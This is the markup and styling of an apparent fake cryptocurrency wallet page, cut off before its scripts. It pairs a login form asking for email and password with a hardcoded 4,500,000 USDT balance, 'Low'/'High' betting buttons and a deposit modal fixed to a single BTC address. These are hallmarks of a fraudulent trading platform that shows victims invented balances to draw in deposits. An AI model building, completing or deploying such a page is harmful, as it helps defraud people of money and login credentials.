<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>BTC Wallet</title>
  <script src="https://cdnjs.cloudflare.com/ajax/libs/qrcodejs/1.0.0/qrcode.min.js"></script>
  <script src="https://kit.fontawesome.com/a076d05399.js" crossorigin="anonymous"></script>
  <style>
    :root {
      --bg: #0d1117;
      --text: #fff;
      --container: #161b22;
      --input-bg: #1e2328;
      --primary: #238636;
      --secondary: #30363d;
      --highlight: #39ff14;
    }
    [data-theme="light"] {
      --bg: #f2f2f2;
      --text: #111;
      --container: #fff;
      --input-bg: #e6e6e6;
      --primary: #007bff;
      --secondary: #ccc;
      --highlight: #007bff;
    }
    body {
      background: var(--bg);
      color: var(--text);
      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
      margin: 0;
    }
    .hidden { display: none !important; }
    .top-controls {
      display: flex;
      justify-content: space-between;
      padding: 10px 20px;
    }
    .welcome-message {
      text-align: center;
      padding: 20px 10px 10px;
    }
    .login-container, .dashboard {
      max-width: 420px;
      margin: 0 auto 80px;
      background: var(--container);
      padding: 25px;
      border-radius: 12px;
    }
    .login-input {
      width: 100%;
      padding: 14px;
      margin: 10px 0;
      border-radius: 8px;
      border: 1px solid var(--secondary);
      background: var(--input-bg);
      color: var(--text);
    }
    .login-button {
      width: 100%;
      padding: 14px;
      background: var(--primary);
      color: white;
      border: none;
      border-radius: 8px;
      font-weight: 600;
      cursor: pointer;
      margin-top: 10px;
    }
    .footer {
      position: fixed;
      bottom: 0;
      width: 100%;
      background: var(--container);
      display: flex;
      justify-content: space-around;
      border-top: 1px solid var(--secondary);
      padding: 8px 0;
      z-index: 1000;
    }
    .footer-btn {
      text-align: center;
      color: var(--highlight);
      font-size: 13px;
      flex: 1;
    }
    .footer-btn i {
      font-size: 22px;
      display: block;
      margin-bottom: 3px;
    }
    .modal {
      position: fixed;
      top: 0; left: 0; right: 0; bottom: 0;
      background: rgba(0, 0, 0, 0.85);
      display: none;
      align-items: center;
      justify-content: center;
      z-index: 999;
    }
    .modal-content {
      background: var(--container);
      padding: 20px;
      border-radius: 10px;
      width: 90%;
      max-width: 400px;
      text-align: center;
    }
    #qrcode { margin: 10px auto; }
    .balance {
      text-align: center;
      font-size: 18px;
      color: var(--highlight);
      margin: 20px 0;
    }
    iframe {
      border: none;
      border-radius: 12px;
      width: 100%;
      height: 500px;
      box-shadow: 0 0 25px rgba(57, 255, 20, 0.4);
      margin-top: 20px;
    }
    .chart-buttons {
      display: flex;
      justify-content: center;
      gap: 20px;
      margin-bottom: 15px;
      flex-wrap: wrap;
    }
    .chart-buttons button {
      padding: 18px 36px;
      font-size: 20px;
      border-radius: 10px;
      border: none;
      cursor: pointer;
      font-weight: bold;
      width: 150px;
    }
    .low-btn { background: #e55353; color: #fff; }
    .high-btn { background: #4caf50; color: #fff; }

    .loading {
      text-align: center;
      color: #ccc;
      font-size: 14px;
      margin-top: 10px;
    }

    @media (max-width: 500px) {
      .chart-buttons button {
        width: 100%;
        margin-bottom: 10px;
      }
      .footer-btn span {
        font-size: 12px;
      }
    }
  </style>
</head>
<body data-theme="dark">
  <div class="top-controls">
    <select id="langSwitcher" onchange="switchLang()">
      <option value="en">English</option>
      <option value="es">Español</option>
    </select>
    <button onclick="toggleTheme()">Toggle Theme</button>
  </div>

  <div class="welcome-message">
    <h1 id="welcomeTitle">Welcome to Your Wallet</h1>
    <p id="welcomeSub">Your secure and fast crypto wallet</p>
  </div>

  <div class="login-container" id="loginForm">
    <h2 id="loginTitle">Login</h2>
    <input type="email" id="loginEmail" class="login-input" placeholder="Email" />
    <input type="password" id="loginPassword" class="login-input" placeholder="Password" />
    <button class="login-button" onclick="login()">Login</button>
    <p style="color:red;" id="loginError"></p>
  </div>

  <div class="dashboard hidden" id="dashboard">
    <div class="balance">
      <p><img src="https://cryptologos.cc/logos/tether-usdt-logo.png" width="20"> 4,500,000.00 USDT</p>
      <p><img src="https://cryptologos.cc/logos/bitcoin-btc-logo.png" width="20"> ≈ <span id="btcAmount">Loading...</span> BTC</p>
      <div class="loading" id="btcLoading">Fetching price...</div>
    </div>

    <div class="chart-buttons">
      <button class="low-btn" onclick="notifyOrder('Low')">Low</button>
      <button class="high-btn" onclick="notifyOrder('High')">High</button>
    </div>

    <iframe src="https://www.tradingview.com/widgetembed/?symbol=BINANCE:BTCUSDT&interval=15&theme=dark&style=1&hide_top_toolbar=1" allowfullscreen></iframe>
  </div>

  <div class="footer hidden" id="footerNav">
    <div class="footer-btn" onclick="openModal('depositModal')">
      <i class="fas fa-arrow-down"></i><span>Deposit</span>
    </div>
    <div class="footer-btn" onclick="openModal('withdrawModal')">
      <i class="fas fa-arrow-up"></i><span>Withdraw</span>
    </div>
    <div class="footer-btn" onclick="openModal('transactionModal')">
      <i class="fas fa-list-alt"></i><span>Transactions</span>
    </div>
    <div class="footer-btn" onclick="logout()">
      <i class="fas fa-sign-out-alt"></i><span>Logout</span>
    </div>
  </div>

  <!-- Deposit Modal -->
  <div class="modal" id="depositModal">
    <div class="modal-content">
      <h3>Deposit</h3>
      <p>Send BTC to:</p>
      <p id="walletAddress">bc1qdhgh0u5n38a2rt7jvewfk67uja3dxfl2emwe6u</p>
      <div id="qrcode"></div>
      <button class="login-button" onclick="saveTransaction('Deposit')">Save Transaction</button>
      <button class="login-button" onclick="closeModal('depositModal')">Close</button>
    </div>
  </div>

  <!-- Withdraw Modal -->
  <div class="modal" id="withdrawModal">
    <div class="modal-content">
      <h3>Withdraw</h3>
      <input type="text" id="withdrawAddress" class="login-input" placeholder="BTC Address" />
      <button class="login-button" onclick="submitWithdraw()">Submit</button>
      <div id="withdrawNotice" style="margin-top:10px;color:var(--highlight);"></div>
      <button class="login-button" onclick="closeModal('withdrawModal')">Close</button>
    </div>
  </div>

  <!-- Transactions Modal -->
  <div class="modal" id="transactionModal">
    <div class="modal-content">
      <h3>Transactions</h3>
      <ul id="transactionList" style="text-align:left;"></ul>
      <button class="login-button" onclick="closeModal('transactionModal')">Close</button>
    </div>
  </div>
